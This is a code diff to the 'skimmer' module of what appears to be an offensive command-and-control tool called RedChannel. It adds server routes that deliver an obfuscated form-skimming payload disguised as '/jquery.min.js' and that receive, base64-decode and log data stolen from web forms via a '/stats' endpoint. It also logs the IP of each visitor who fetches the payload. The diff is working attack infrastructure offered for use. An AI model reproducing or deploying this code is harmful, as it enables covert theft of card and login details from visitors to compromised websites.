@@ -1,5 +1,8 @@
+import { Request, Response } from "express";
 import * as fs from "fs";
 import { obfuscate, ObfuscationResult } from "javascript-obfuscator";
+import Logger from "../lib/logger";
+import RedChannel from "../lib/redchannel";
 
 import { Constants, emsg } from "../utils/utils";
 import BaseModule, { ExecuteReturn } from "./base";
@@ -8,7 +11,7 @@ const MODULE_DESCRIPTION = "manage the skimmer configuration";
 
 const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";
 
-export type SkimmerConfig = {
+export type SkimmerModuleConfig = {
     payload_route: string;
     data_route: string;
     url: string;
@@ -19,22 +22,21 @@ export type SkimmerConfig = {
 
 export default class SkimmerModule extends BaseModule {
     payload: string;
-    config: SkimmerConfig;
+    config: SkimmerModuleConfig;
 
-    constructor(protected configFile) {
-        super("skimmer", configFile);
+    constructor(protected redChannel: RedChannel, mergeConfig: Partial<SkimmerModuleConfig>) {
+        super("skimmer", redChannel.configFile, mergeConfig);
 
         this.description = MODULE_DESCRIPTION;
 
-        this.config = {
+        this.config = this.resetConfig({
             payload_route: "/jquery.min.js",
             data_route: "/stats",
             url: "",
             target_classes: [],
             target_ids: [],
             obfuscate_payload: true,
-        };
-        this.config = this.getConfigFromFile() as SkimmerConfig;
+        });
 
         this.defineCommands({
             generate: {
@@ -139,5 +141,25 @@ export default class SkimmerModule extends BaseModule {
         }
 
         return { message: `skimmer payload set to: \n${this.payload}` };
+    }
+
+    setupRoutes(webServer: any, logger: Logger): void {
+        webServer.get(this.config.data_route, (request: Request, response: Response) => {
+            logger.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
+
+            if (request.query?.id) {
+                const skimmerId = request.query.id as string;
+                const decodedData = Buffer.from(skimmerId, "base64").toString();
+                logger.success(`incoming skimmer data:\n${decodedData}`);
+            } else {
+            }
+            response.send();
+        });
+
+        webServer.get(this.config.payload_route, (request: Request, response: Response) => {
+            const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
+            logger.warn(`incoming request for skimmer payload from ${ip}`);
+            response.send(this.payload);
+        });
     }
 }
